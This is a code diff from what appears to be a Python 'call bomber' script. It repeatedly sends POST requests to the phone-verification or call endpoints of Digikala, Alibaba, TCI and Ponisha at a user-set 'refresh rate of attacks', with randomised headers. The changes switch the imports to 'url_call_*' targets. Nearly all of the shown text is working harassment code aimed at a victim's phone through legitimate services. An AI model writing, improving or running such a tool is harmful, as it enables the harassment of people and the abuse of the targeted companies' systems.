@@ -16,7 +16,7 @@ cyan = "\033[36m"
 purple = "\033[35m"
 #########################
 
-from date_call import number, heads, url_digikala, json_digikala, url_alibaba, json_alibaba, url_tci, json_tci, url_ponisha, json_ponisha
+from date_call import *
 
 attack_speed = float(input(("" + cyan + "[" + Red + "Enter The " + Blue + "refresh rate of attacks" + cyan + "]─[" + Red + "in seconds :" + cyan + "]" + Reset))) 
 
@@ -40,20 +40,20 @@ i = 0
 while i < numbert:
     random_head = random.choice(heads)
 
-    req_Digikala = requests.post(url_digikala,json=json_digikala,headers=random_head)
+    req_Digikala = requests.post(url_call_digikala,json=json_call_digikala,headers=random_head)
     print(yellow + "1-Digikala : " + str(req_Digikala))
     time.sleep(sleep_time)
     time.sleep(8)
 
-    req_Alibaba = requests.post(url=url_alibaba,json=json_alibaba)
+    req_Alibaba = requests.post(url=url_call_alibaba,json=json_call_alibaba)
     print(yellow + "2-Alibaba : " + str(req_Alibaba))
     time.sleep(sleep_time)
 
-    req_tci = requests.post(url=url_tci,json=json_tci,headers=random_head)
+    req_tci = requests.post(url=url_call_tci,json=json_call_tci,headers=random_head)
     print(yellow + "3-Tci : " + str(req_tci))
     time.sleep(sleep_time)
 
-    req_ponisha = requests.post(url=url_ponisha,json=json_ponisha,headers=random_head)
+    req_ponisha = requests.post(url=url_call_ponisha,json=json_call_ponisha,headers=random_head)
     print(yellow + "4-ponisha : " + str(req_ponisha))
     time.sleep(sleep_time)
 
